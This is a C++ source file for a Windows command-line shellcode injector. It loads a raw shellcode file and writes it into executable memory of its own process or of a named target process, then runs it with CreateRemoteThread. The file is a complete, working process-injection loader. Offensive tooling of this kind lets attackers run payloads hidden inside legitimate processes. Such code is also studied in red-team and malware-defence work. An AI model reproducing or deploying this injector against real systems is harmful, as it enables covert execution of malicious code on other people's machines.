#include <windows.h>
#include <sys/types.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string>
#include <fstream>
#include <sstream>


using namespace std;

DWORD FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}


int main(int argc, char** argv) {

	LPVOID pointer_after_allocated;
	HANDLE processHandle;
	FILE* file;
	string processToInject;

	bool selfInjection = true;

	if (argc < 2 || argc > 3) {
		printf("Usage: %s <shellcode_file_path> [processToInject:if empty, self-injection]", argv[0]);
		exit(1);
	}
	else if (argc == 3) {
		selfInjection = false;
		processToInject = string(argv[2]);
	}

	char* shellcodeFileName = argv[1];


	/* Reading shellcode file */

	fopen_s(&file, shellcodeFileName, "rb");

	if (!file) {
		printf("[-] Error: Unable to open %s\n", shellcodeFileName);
		exit(1);
	}
	fseek(file, 0, SEEK_END);
	size_t shellcodeLen = ftell(file); //Get Length

	printf("[+] File Size: %d bytes\n", shellcodeLen);
	fseek(file, 0, SEEK_SET); //Reset

	shellcodeLen += 1;

	char* buffer = (char*)malloc(shellcodeLen); //Create Buffer
	fread(buffer, shellcodeLen, 1, file);
	fclose(file);

	// Open process to Inject
	if (selfInjection) {
		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	}
	else {
		std::wstring ws(processToInject.begin(), processToInject.end());
		DWORD pid = FindProcessId(ws);
		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	}

	if (processHandle == NULL)
	{
		puts("[-]Error while opening the process\n");
		exit(2);
	}
	puts("[+] Process Opened sucessfully\n");

	// Allocate memory in the remote process
	pointer_after_allocated = VirtualAllocEx(processHandle, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pointer_after_allocated == NULL) {
		puts("[-]Error while get the base address to write\n");

	}
	printf("[+]Got the address to write 0x%p\n", pointer_after_allocated);

	// Writing process memory with our shellcode
	SIZE_T writtenBytes;
	if (WriteProcessMemory(processHandle, (LPVOID)pointer_after_allocated, (LPCVOID)buffer, shellcodeLen, &writtenBytes) && writtenBytes == shellcodeLen) {
		printf("[+]Shellcode correctly injected\nPress a key to run the shellcode as new thread !\n");
		getchar();
		CreateRemoteThread(processHandle, NULL, 100, (LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, (LPDWORD)0x50002);
	}
	else {
		puts("[-]Error while writing shellcode in memory\n");
	}

}